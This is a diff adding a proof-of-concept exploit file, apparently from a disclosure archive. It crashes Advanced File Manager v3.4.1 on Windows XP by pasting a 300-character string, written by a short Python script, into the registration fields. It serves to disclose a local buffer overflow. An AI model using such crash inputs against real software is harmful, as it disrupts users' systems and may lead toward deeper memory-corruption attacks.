@@ -1,0 +1,21 @@
+# Exploit Title: Advanced File Manager v3.4.1 - Denial of Service (PoC)
+# Discovery by: Rafael Pedrero
+# Discovery Date: 2019-01-30
+# Vendor Homepage: http://www.advexsoft.com
+# Software Link : http://www.advexsoft.com
+# Tested Version: 3.4.1
+# Tested on: Windows XP SP3
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+
+# Steps to Produce the Crash:
+# 1.- Run af_mgr.exe
+# 2.- copy content af_mgr_Crash.txt or 300 "A" to clipboard (result from this python script)
+# 3.- Go to Help - Enter registration code and paste the result in all fields: "Person", "Organization", "E-mail" and "Enter your registration key below, please:"
+# 4.- Click in Register button and you will see a crash.
+
+#!/usr/bin/env python
+
+crash = "\x41" * 300
+f = open ("af_mgr_Crash.txt", "w")
+f.write(crash)
+f.close()
